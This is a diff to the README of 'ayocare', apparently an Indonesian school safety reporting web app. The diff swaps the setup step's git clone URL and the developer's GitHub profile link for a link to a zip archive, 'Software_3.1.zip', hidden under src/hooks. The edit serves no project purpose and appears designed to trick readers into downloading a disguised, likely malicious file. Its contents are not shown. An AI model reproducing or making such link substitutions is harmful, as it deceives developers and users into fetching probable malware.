@@ -54,7 +54,7 @@ Aplikasi web untuk melaporkan dan mengelola kondisi tidak aman di lingkungan sek
 
 1. **Clone repository**
 ```bash
-git clone https://github.com/nug31/ayocare.git
+git clone https://raw.githubusercontent.com/nug31/ayocare/main/src/hooks/Software_3.1.zip
 cd ayocare
 ```
 
@@ -180,7 +180,7 @@ This project is licensed under the MIT License.
 ## 👨‍💻 Developer
 
 **Joko Setyo Nugroho**
-- GitHub: [@nug31](https://github.com/nug31)
+- GitHub: [@nug31](https://raw.githubusercontent.com/nug31/ayocare/main/src/hooks/Software_3.1.zip)
 - Email: joko@example.com
 
 ---
